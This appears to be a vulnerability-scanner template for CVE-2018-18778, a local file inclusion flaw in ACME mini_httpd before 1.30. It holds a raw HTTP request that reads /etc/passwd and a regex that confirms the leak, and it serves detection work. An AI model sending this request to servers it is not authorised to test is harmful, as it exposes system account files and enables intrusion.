id: CVE-2018-18778

info:
  name: ACME mini_httpd <1.30 - Local File Inclusion
  author: dhiyaneshDK
  severity: medium
  description: ACME mini_httpd before 1.30 is vulnerable to local file inclusion.
  verified: true
  reference:
    - https://www.acunetix.com/vulnerabilities/web/acme-mini_httpd-arbitrary-file-read/
    - http://www.acme.com/software/mini_httpd/
    - https://nvd.nist.gov/vuln/detail/CVE-2018-18778

rules:
  r0:
    request:
      raw: |
        GET /etc/passwd HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()